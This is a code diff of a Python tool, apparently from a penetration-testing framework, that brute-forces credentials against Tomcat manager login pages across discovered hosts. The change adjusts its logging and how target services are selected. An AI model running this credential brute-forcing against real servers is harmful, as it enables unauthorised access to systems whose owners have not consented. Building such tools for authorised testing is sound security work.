@@ -26,8 +26,8 @@ def brutefore_passwords(ip, url, credentials):
             creds = result.request.headers['Authorization'].split(' ')[1]
             creds = base64.b64decode(creds).decode('utf-8')
             creds = creds.split(':')
-            print_success("Found a password for tomcat: {0}:{1} at ip: {2}".format(
-                creds[0], creds[1], ip))
+            print_success("Found a password for tomcat: {0}:{1} at: {2}".format(
+                creds[0], creds[1], url))
 
 
 def main():
@@ -43,16 +43,14 @@ def main():
         print_error("Please provide a file with credentials seperated by ':'")
         sys.exit()
 
-    if arguments.ports or arguments.search or arguments.tags or services.is_pipe:
-        services = services.get_services()
-    else:
-        services = services.search(search="Tomcat", up=True, tags='!tomcat_brute')
+    services = services.get_services(search="Tomcat", up=True, tags='!tomcat_brute')
 
     credentials = []
     with open(arguments.file, 'r') as f:
         credentials = f.readlines()
 
     for service in services:
+        print_notification("Checking ip:{} port {}".format(service.address, service.port))
         url = 'http://{}:{}/manager/html'
         gevent.spawn(brutefore_passwords, service.address, url.format(service.address, service.port), credentials)
         service.add_tag('tomcat_brute')
